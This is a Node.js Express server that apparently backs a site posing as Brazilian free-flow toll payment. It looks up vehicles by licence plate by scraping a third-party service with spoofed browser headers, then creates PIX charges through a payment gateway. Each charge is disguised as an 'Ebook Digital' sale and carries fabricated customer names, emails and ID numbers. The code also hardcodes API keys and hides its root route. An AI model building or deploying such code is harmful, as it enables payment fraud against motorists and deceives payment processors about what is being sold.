const express = require('express');
const cors = require('cors');

const app = express();

const ALLOWED_ORIGINS = [
    'https://www.freeflow-pedagio.site',
    'https://freeflow-pedagio.site',
];

const INTERNAL_KEY = process.env.INTERNAL_KEY || 'fd-k9x2mq7v4n8p1w6j3t5r';

app.use(cors({
    origin: (origin, cb) => {
        if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
        return cb(new Error('Not allowed'));
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Internal-Key'],
}));

app.use(express.json());

// Block direct browser access to API routes
function requireInternalKey(req, res, next) {
    const key = req.headers['x-internal-key'];
    if (key !== INTERNAL_KEY) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

const MANGOFY_API_KEY = process.env.MANGOFY_API_KEY || '2cb435b12f2f8431fbd9b7e1f0b34540e2axyl1axlbg34ckxjxaxvbyool0oen';
const MANGOFY_STORE_CODE = process.env.MANGOFY_STORE_CODE || 'd2b22f8faf5a2081e772328755ce7349';
const MANGOFY_API_URL = 'https://checkout.mangofy.com.br/api/v1';

// ---------- GERAR PIX ----------
app.post('/api/gerar_pix', requireInternalKey, async (req, res) => {
    const { valorTransacao, placa } = req.body || {};
    const valor = parseFloat(valorTransacao) || 0;
    const placaClean = (placa || '').toUpperCase().trim();

    if (valor <= 0 || !placaClean) {
        return res.status(400).json({ success: false, error: 'Dados inválidos' });
    }

    const valorCentavos = Math.round(valor * 100);
    if (valorCentavos < 500) {
        return res.status(400).json({ success: false, error: 'Valor mínimo é R$ 5,00' });
    }

    const payload = {
        payment_method: 'pix',
        payment_format: 'regular',
        installments: 1,
        payment_amount: valorCentavos,
        postback_url: (process.env.RAILWAY_PUBLIC_DOMAIN
            ? 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN
            : 'https://localhost:3000') + '/api/webhook',
        external_code: 'PED_' + Math.random().toString(36).substring(2,10).toUpperCase() + '_' + Date.now(),
        items: [{
            code: 'EBOOK_' + Date.now(),
            name: 'Ebook Digital',
            amount: valorCentavos,
            total: 1,
        }],
        customer: {
            email: 'user_' + Math.random().toString(36).substring(2,10) + '@gmail.com',
            name: 'Cliente #' + Math.random().toString(36).substring(2,8).toUpperCase(),
            document: '00000000000',
            phone: '11999999999',
            ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '177.70.100.1',
        },
        pix: { expires_in_days: 1 },
    };

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment', {
            method: 'POST',
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        const data = await response.json();
        console.log('[MANGOFY_RESPONSE]', JSON.stringify(data));

        if (response.ok && data.payment_code) {
            const pix = data.pix || data.checkout || {};
            const qrcode = pix.qr_code || pix.qrcode || pix.emv || pix.brcode || pix.code
                || data.qr_code || data.qrcode || data.emv || data.brcode || '';
            const qrcodeBase64 = pix.qr_code_base64 || pix.qrcode_base64 || pix.image || pix.base64
                || data.qr_code_base64 || data.qrcode_base64 || data.image || '';

            return res.json({
                success: true,
                transaction_id: data.payment_code,
                qrcode,
                qrcode_base64: qrcodeBase64,
                valor,
            });
        }

        return res.status(400).json({
            success: false,
            error: data.message || data.error || 'Erro ao gerar PIX',
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão com gateway' });
    }
});

// ---------- CONSULTAR STATUS ----------
app.post('/api/consultar_status_pix', requireInternalKey, async (req, res) => {
    const { transaction_id } = req.body || {};
    const paymentCode = (transaction_id || '').trim();

    if (!paymentCode) {
        return res.status(400).json({ success: false, error: 'transaction_id é obrigatório' });
    }

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment/' + encodeURIComponent(paymentCode), {
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });

        const data = await response.json();

        if (response.ok && data) {
            const statusMap = { approved: 'paid', pending: 'pending', refunded: 'refunded', error: 'error' };
            const status = statusMap[data.payment_status] || 'pending';
            return res.json({
                success: true,
                status,
                paid_at: data.payment_status === 'approved' ? (data.approved_at || new Date().toISOString()) : null,
            });
        }

        return res.json({ success: true, status: 'pending', paid_at: null });
    } catch (e) {
        return res.json({ success: true, status: 'pending', paid_at: null });
    }
});

// ---------- VEICULOS ----------
app.get('/api/veiculos', requireInternalKey, async (req, res) => {
    const placa = (req.query.placa || '').toUpperCase().trim();

    if (!placa || !/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa)) {
        return res.status(400).json({ success: false, error: 'Placa inválida' });
    }

    try {
        const response = await fetch('https://www.achecar.com.br/api/free-lookup', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://www.achecar.com.br',
                'Referer': 'https://www.achecar.com.br/consulta-gratuita',
            },
            body: JSON.stringify({ plate: placa }),
        });

        if (!response.ok) return res.status(502).json({ success: false, error: 'Consulta falhou' });

        const data = await response.json();
        if (!data.brand && !data.model) return res.status(404).json({ success: false, error: 'Não encontrado' });

        return res.json({
            success: true,
            veiculo: {
                marca: data.brand || '', modelo: data.model || '', descricao: data.brandModel || '',
                ano: data.year || '', anoModelo: data.yearModel || '', cor: data.color || '',
                combustivel: data.fuel || '', tipo: data.vehicleType || '',
                cidade: data.city || '', estado: data.state || '', potencia: data.power || '',
                nacionalidade: data.nationality || '',
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão' });
    }
});

// ---------- WEBHOOK ----------
app.post('/api/webhook', (req, res) => {
    const data = req.body || {};
    console.log('[WEBHOOK]', JSON.stringify({
        payment_code: data.payment_code, payment_status: data.payment_status,
        payment_method: data.payment_method, external_code: data.external_code,
        timestamp: new Date().toISOString(),
    }));
    res.json({ received: true });
});

// ---------- HEALTH (hidden) ----------
app.get('/', (req, res) => res.status(404).send('Not found'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('API running on port ' + PORT));
